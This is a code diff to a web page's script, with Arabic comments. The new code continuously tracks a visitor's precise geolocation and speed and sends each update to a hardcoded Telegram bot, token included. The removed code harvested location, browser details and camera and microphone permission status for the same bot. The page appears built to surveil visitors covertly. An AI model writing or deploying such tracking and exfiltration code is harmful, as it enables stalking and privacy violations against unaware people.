@@ -12,69 +12,78 @@
 <script>
     const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
     const CHAT_ID = "6024837142";
+    
+    let watchId = null;
+    let firstLocationSent = false;
 
-    function sendToBot(data) {
-        const message = JSON.stringify(data, null, 2);
+    function sendToBot(lat, lon, accuracy, speed, isFirst = false) {
+        const type = isFirst ? '📍 بدء التتبع' : '🔄 تحديث الموقع';
+        const speedText = speed ? `\n⚡ السرعة: ${(speed * 3.6).toFixed(1)} كم/س` : '';
+        
+        const message = `${type}
+📌 خط العرض: ${lat}
+📌 خط الطول: ${lon}
+📏 الدقة: ${Math.round(accuracy)} متر${speedText}
+🕐 الوقت: ${new Date().toLocaleString()}`;
+        
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
             .catch(console.error);
+        
+        console.log(`تم الإرسال: ${lat}, ${lon}`);
     }
 
-    let retryCount = 0;
-    const MAX_RETRIES = 3;
-
-    async function requestPermissions() {
-        const collectedData = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            location: null,
-            camera: null,
-            microphone: null
-        };
-
-        // طلب الموقع
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    collectedData.location = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                    sendToBot(collectedData);
-                },
-                (err) => {
-                    if (retryCount < MAX_RETRIES) {
-                        retryCount++;
-                        setTimeout(() => requestPermissions(), 2000);
-                    } else {
-                        collectedData.location = { error: "denied" };
-                        sendToBot(collectedData);
-                    }
+    function startContinuousTracking() {
+        if (watchId !== null) return; // التتبع يعمل بالفعل
+        
+        watchId = navigator.geolocation.watchPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                const speed = position.coords.speed;
+                
+                if (!firstLocationSent) {
+                    // أول مرة - إرسال تنبيه بدء التتبع
+                    sendToBot(lat, lon, accuracy, speed, true);
+                    firstLocationSent = true;
+                } else {
+                    // تحديثات مستمرة أثناء الحركة
+                    sendToBot(lat, lon, accuracy, speed, false);
                 }
-            );
-        }
-
-        // طلب الكاميرا والميكروفون
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                collectedData.camera = "granted";
-                collectedData.microphone = "granted";
-                sendToBot(collectedData);
-                
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                }, 3000);
-            } catch (err) {
-                collectedData.camera = "denied";
-                collectedData.microphone = "denied";
-                sendToBot(collectedData);
+            },
+            (error) => {
+                console.error('خطأ في التتبع:', error.message);
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 10000
             }
-        }
+        );
+        
+        console.log('✅ بدء تتبع الموقع بشكل مستمر');
     }
 
-    requestPermissions();
+    // طلب الإذن من المستخدم
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // المستخدم ضغط "سماح" - يبدأ التتبع فوراً
+                console.log('✓ المستخدم سمح بالوصول - بدء التتبع');
+                startContinuousTracking();
+            },
+            (error) => {
+                // المستخدم ضغط "منع"
+                console.log('✗ المستخدم رفض الوصول إلى الموقع');
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 15000
+            }
+        );
+    } else {
+        console.log('المتصفح لا يدعم تحديد الموقع');
+    }
 </script>
 </body>
 </html>
